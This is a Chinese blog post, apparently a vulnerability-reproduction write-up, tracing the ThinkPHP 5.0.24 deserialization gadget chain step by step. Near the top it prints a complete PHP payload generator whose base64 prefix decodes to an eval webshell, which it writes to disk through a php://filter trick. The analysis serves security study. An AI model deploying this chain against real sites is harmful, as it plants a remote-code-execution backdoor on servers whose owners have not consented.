@@ -1,0 +1,224 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>ThinkPhp5.0.x反序列化链分析 | Mengd@</title><meta name="keywords" content="-Thinkphp5 -源码审计 -漏洞复现 -反序列化"><meta name="author" content="Mengd@"><meta name="copyright" content="Mengd@"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="前言：之前花了很大的功夫审计了Thinkphp5.1.x的反序列化利用连，对整个反序列化的利用过程和整个代码审计的逻辑，过程都学到了很多，这次继续来分析Thinkphp5.0.X的反序列化利用连比第一次轻松，容易了许多，也学到了不少新的东西，对代码逻辑的理解又更深了。 复现环境：thinkphp5.0.24，windows10 0x01:从与5.1不一样的地方开始入手因为所用到的知识以及配置的环境">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPhp5.0.x反序列化链分析">
+<meta property="og:url" content="http://example.com/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Mengd@">
+<meta property="og:description" content="前言：之前花了很大的功夫审计了Thinkphp5.1.x的反序列化利用连，对整个反序列化的利用过程和整个代码审计的逻辑，过程都学到了很多，这次继续来分析Thinkphp5.0.X的反序列化利用连比第一次轻松，容易了许多，也学到了不少新的东西，对代码逻辑的理解又更深了。 复现环境：thinkphp5.0.24，windows10 0x01:从与5.1不一样的地方开始入手因为所用到的知识以及配置的环境">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s3.ax1x.com/2021/01/25/sL7oGj.png">
+<meta property="article:published_time" content="2021-04-27T09:41:59.000Z">
+<meta property="article:modified_time" content="2021-04-29T00:56:39.028Z">
+<meta property="article:author" content="Mengd@">
+<meta property="article:tag" content="-Thinkphp5 -源码审计 -漏洞复现 -反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s3.ax1x.com/2021/01/25/sL7oGj.png"><link rel="shortcut icon" href="https://s3.ax1x.com/2021/01/15/s0eSiT.png"><link rel="canonical" href="http://example.com/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: {"text":"Mengd@,Flag,CTF,Web,Misc,Pwn,N0p3,Nysec","fontSize":"15px"},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-04-29 08:56:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Mengd@" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://s3.ax1x.com/2021/01/15/s010Z4.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://s3.ax1x.com/2021/01/25/sL7oGj.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mengd@</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">ThinkPhp5.0.x反序列化链分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-04-27T09:41:59.000Z" title="发表于 2021-04-27 17:41:59">2021-04-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-29T00:56:39.028Z" title="更新于 2021-04-29 08:56:39">2021-04-29</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>之前花了很大的功夫审计了Thinkphp5.1.x的反序列化利用连，对整个反序列化的利用过程和整个代码审计的逻辑，过程都学到了很多，这次继续来分析Thinkphp5.0.X的反序列化利用连比第一次轻松，容易了许多，也学到了不少新的东西，对代码逻辑的理解又更深了。</p>
+<h2 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h2><p>thinkphp5.0.24，windows10</p>
+<h2 id="0x01-从与5-1不一样的地方开始入手"><a href="#0x01-从与5-1不一样的地方开始入手" class="headerlink" title="0x01:从与5.1不一样的地方开始入手"></a>0x01:从与5.1不一样的地方开始入手</h2><p>因为所用到的知识以及配置的环境都和5.0.24的哪一条链很类似，只不过利用的类，方式不同了，大同小异，所以我们跳过与5.1相似的地方直接从不一样的地方开始分析。</p>
+<p>先放出payload方便分析：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files &#x3D; [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files &#x3D; [new \think\model\Merge];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model;</span><br><span class="line">use think\Model;</span><br><span class="line"></span><br><span class="line">class Merge extends Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append &#x3D; [];</span><br><span class="line">    protected $error;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;append &#x3D; [</span><br><span class="line">            &#39;MENGDA&#39; &#x3D;&gt; &#39;getError&#39;</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;error &#x3D; (new \think\model\relation\BelongsTo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think;</span><br><span class="line">class Model&#123;&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console;</span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    protected $styles &#x3D; [];</span><br><span class="line">    private $handle &#x3D; null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;styles &#x3D; [&#39;removeWhereField&#39;];</span><br><span class="line">        $this-&gt;handle &#x3D; (new \think\session\driver\Memcache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">class BelongsTo</span><br><span class="line">&#123;</span><br><span class="line">    protected $query;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;query &#x3D; (new \think\console\Output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver;</span><br><span class="line">class Memcache</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler &#x3D; null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler &#x3D; (new \think\cache\driver\Memcached);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options &#x3D; [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag &#x3D; false;</span><br><span class="line">        $this-&gt;options &#x3D; [</span><br><span class="line">            &#39;expire&#39;        &#x3D;&gt; 3600,</span><br><span class="line">            &#39;cache_subdir&#39;  &#x3D;&gt; false,</span><br><span class="line">            &#39;prefix&#39;        &#x3D;&gt; &#39;&#39;,</span><br><span class="line">            &#39;data_compress&#39; &#x3D;&gt; false,</span><br><span class="line">            &#39;path&#39;          &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;&#39;,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options &#x3D; [];</span><br><span class="line">    protected $handler &#x3D; null;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag &#x3D; true;</span><br><span class="line">        $this-&gt;options &#x3D; [</span><br><span class="line">            &#39;expire&#39;   &#x3D;&gt; 0,</span><br><span class="line">            &#39;prefix&#39;   &#x3D;&gt; &#39;PD9waHAgZXZhbCgkX0dFVFsnbWVuZ2RhJ10pOz8+&#39;,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;handler &#x3D; (new File);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo base64_encode(serialize(new \think\process\pipes\Windows()));</span><br></pre></td></tr></table></figure>
+
+<p>和5.1一样，最初的入口都是Windows类中的destruct魔术方法，然后在file_exists中传入一个实例化对象调用此对象的toString魔术方法。这里就不多说了，不一样的也就从这里开始了。</p>
+<p>在Payload中可以看到windows类中实例化的对象是Merge对象，而我们发现Merge对象是继承自Model对象的，所以直接来到Model类的toArray方法，到此都和5.1的链是一样的，都是进入了Model类的toArray方法，来到toArray方法后就和5.1发生了变化。</p>
+<p>首先我们看到</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/R3%7DGI26US1Q8587Y%7DR%602RR.png" class title="img">
+
+<p>在这$this-&gt;append可控，payload中将值设置为了’MENGDA’ =&gt; ‘getError’，那么在经过第一个foreach后，$key=MENGDA,$name=getError，我们看到第899行代码，进入parseName，此时传入的$name参数为getError，</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428105847337.png" class title="image-20210428105847337">
+
+<p>可以看到parseName函数只是进行了一下格式转换，直接返回getError，此时$relation的值为getError，虽后便来到第900行代码，检测当前类中是否存在getError方法，若存在则将$modelRelation的值赋值为$this-&gt;$relation()的返回值，而此时$relation为getError，所以$modelRelation的值为model类中getError方法的返回值，我们看一下这个方法。</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428110202314.png" class title="image-20210428110202314">
+
+<p>可以看到，getError直接返回$this-&gt;error，也就是直接返回一个我们可以控制的值。那么到现在$modelRelation的值我们可控了，根据payload可得知，我们将它控制为\think\model\relation\BelongsTo类。</p>
+<p>紧接着我们回到toArray方法来到第902行代码，进入getRelationData()方法，代码如下：</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428111041123.png" class title="image-20210428111041123">
+
+<p>可以看到该方法要求传入参数是一个Relation类型的类，这也是为什么我们要将$modelRealtion赋值为\think\model\relation\BelongsTo类，因为BelongsTo继承于OneToOne，</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428111220503.png" class title="image-20210428111220503">
+
+<p>而OneToOne又继承于Relation</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428111306724.png" class title="image-20210428111306724">
+
+<p>所以满足需求。</p>
+<p>第一个if无法满足条件直接来到else，此时的$modelRelation为BelongsTo，来到BelongsTo类下的getRelation方法，</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428202024409.png" class title="image-20210428202024409">
+
+<p>此时的$this-&gt;query的值可控，为\think\console\Output类，而output类中并不存在removeWhereField方法，所以跳转到output类中的call魔术方法中。</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428202215223.png" class title="image-20210428202215223">
+
+<p>此处我们可以看到，if条件为$method是否存在于$this-&gt;styles中，而我们不存在的方法就是removeWhereField，所以payload中需要控制$this-&gt;style为removeField满足if条件，进入if可以看到call_user_func_array调用了当前类的block方法，我们的参数传入output类的block方法。来到block方法</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428202737206.png" class title="image-20210428202737206">
+
+<p>将两个参数传入，$style为removeWhereField,$message为null，继续跟进来到writeln中，当前参数没有什么用所以不管他</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428203139611.png" class title="image-20210428203139611">
+
+<p>继续跟进来到write，我们现在处于Output类中的write方法，$massages是上面block方法中writeln方法所传入的字符串，此时$this-&gt;handle为\think\session\driver\Memcache，跳转到Memcache类中的write方法</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428203245049.png" class title="image-20210428203245049">
+
+<p>来到Memcache类中的write方法，此时$this-&gt;handler的值为\think\cache\driver\Memcached，所以跳转到Memcached类的set方法</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428203821914.png" class title="image-20210428203821914">
+
+<p>来到Memcached类中的set方法</p>
+<img src="/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/image-20210428204747464.png" class title="image-20210428204747464">
+
+<p>第109行代码进入判断，进入has方法<img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429081321422.png" alt="image-20210429081321422"></p>
+<p>跟进getCacheKey方法</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429081418204.png" alt="image-20210429081418204"></p>
+<p>可以看到，这里getCacheKey会返回一个$this-&gt;options[‘prefix’]和$name的拼接结果。而此时的getCacheKey是我们通过base64加密过后的危害代码，这个方法在后面会经常用到。紧接着进入下面的get方法，此时的$this-&gt;hanlder为File类，因此我们直接来到File类的get方法</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429081938005.png" alt="image-20210429081938005"></p>
+<p>可以看到$filename为拼接后的字符串，is_file为false，取反为True，直接返回default，然后回到Memached中的set方法，来到下面对$key进行赋值此时再次调用getCacheKey，得到拼接字符串。最后调用File类的set方法，传入的值为$key，$value，$expire。此时仅仅只有$key是我们可控的，其他的无法控制。</p>
+<p>来到file类中的set方法，此时$name就是我们传入的$key</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429082821025.png" alt="image-20210429082821025"></p>
+<p>看到第150行代码，进入getCacheKey中，参数为刚刚拼接过后的字符串($key)。看到第160行代码，这里就是触发文件写入的点，将$data写入$filename，而data在这里我们是不可控的，拼接前的$data存在xeit()，即使我们的$data可控也无法让我们的危害代码执行。这里就绪要通过php伪协议将里面的内容进行加密，加密后exit()就不存在了。我选择的是base64加密，这也是为什么payload中的危害代码是通过base64加密的。</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429082948443.png" alt="image-20210429082948443"></p>
+<p>可以看到首先将$name进行md5加密后进行了拼接。得到filename。这里我们控制$this-&gt;options[‘path’]为php伪协议php://filter/convert.base64-decode/resource=./拼接后的结果为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;$name.php</span><br></pre></td></tr></table></figure>
+
+<p>当带着这个调用file_put_contents时会将$data的内容进行base64解密过后写入./$name.php</p>
+<p>第一次文件写入成功，可是我们并没有将危害代码写入目标服务器。怎么办？</p>
+<p>回到Memacached.php中</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429083851991.png" alt="image-20210429083851991"></p>
+<p>在啊调用完第114行代码的set后我们进入了setTagItem方法，该方法会再次调用set函数，那么这次就给了我们可乘之机。</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429084507081.png" alt="image-20210429084507081"></p>
+<p>if条件不满足直接将$name赋值给了$value，再次调用Memached类中的set方法，而此时，$value可控。</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429084733935.png" alt="image-20210429084733935"></p>
+<p>带着$key，$value都可控的数据再次进入File类的set方法</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429084835386.png" alt="image-20210429084835386"></p>
+<p>直接来到file_put_contents处调用。将危害代码写入名字为d8ff72877afda1b924db7a6527e07dd4.php的文件中，而这个d8ff72877afda1b924db7a6527e07dd4是$name的md5值。文件写入完成。第一个8f开头的文件是第一次无法写入危害代码生成的，第二个d8开头的文件是我们可控后第二次写入的。</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429085316343.png" alt="image-20210429085316343"></p>
+<p>测试：</p>
+<p><img src="/D:ThinkPhp5-0-x反序列化链分析/image-20210429085623474.png" alt="image-20210429085623474"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Mengd@</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/">http://example.com/2021/04/27/ThinkPhp5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Mengd@</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Thinkphp5-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">-Thinkphp5 -源码审计 -漏洞复现 -反序列化</a></div><div class="post_share"><div class="social-share" data-image="https://s3.ax1x.com/2021/01/25/sL7oGj.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/03/03/Golang-Windows%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B8%A9%E5%9D%91/"><img class="next-cover" src="https://s3.ax1x.com/2021/03/03/6AQ6Z6.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Golang-Windows环境配置踩坑(超详细)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/03/02/ThinkPhp5-1-x反序列化漏洞分析利用/" title="ThinkPhp5.1.x反序列化漏洞分析利用"><img class="cover" src="https://s3.ax1x.com/2021/01/25/sL7oGj.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-03-02</div><div class="title">ThinkPhp5.1.x反序列化漏洞分析利用</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://s3.ax1x.com/2021/01/15/s010Z4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Mengd@</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Kumengda"><i class="fab fa-github"></i><span>访问我的github</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is Mengd@ Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">复现环境：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BB%8E%E4%B8%8E5-1%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E5%9C%B0%E6%96%B9%E5%BC%80%E5%A7%8B%E5%85%A5%E6%89%8B"><span class="toc-number">3.</span> <span class="toc-text">0x01:从与5.1不一样的地方开始入手</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" 